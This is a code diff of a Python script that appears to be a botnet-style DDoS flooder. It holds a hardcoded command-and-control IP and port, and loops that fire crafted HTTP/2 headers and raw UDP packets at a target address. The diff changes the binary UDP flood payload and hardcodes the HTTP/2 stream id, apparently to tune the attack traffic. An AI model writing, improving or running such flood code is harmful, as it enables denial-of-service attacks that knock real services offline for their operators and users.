@@ -29,6 +29,7 @@ reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.g
 ipc2 = '198.50.160.231'
 portc2 = 666
 
+
 def strm(siz):
         return '%0x' % ran(0, 16 ** siz)
 
@@ -707,8 +708,7 @@ def main():
                                         "connection": "keep-alive",
                                         "encrypted-data": encrypted_data
                                     }
-                                    stream_id = conn.get_next_available_stream_id()
-                                    conn.send_headers(stream_id , payl)
+                                    conn.send_headers(1  , payl)
                                     s.sendall(conn.data_to_send())
                             except:
                                 pass
@@ -972,8 +972,11 @@ def main():
                             try:
                                 s = socket(AF_INET , SOCK_DGRAM)
                                 for _ in range(rpc):
-                                    payl = (b"\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00"
-                                            b"\x70\x69\x6E\x67\xF8\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+                                    payl = b"\x00\x01\x00\x46\x00\x03\x93\x6a\x00\x00\x00\x00\x00\x00\x00\x00" \
+       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+       b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+       b"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\xe1"
                                     s.sendto(payl , (ip_tt , port))
                             except:
                                 pass
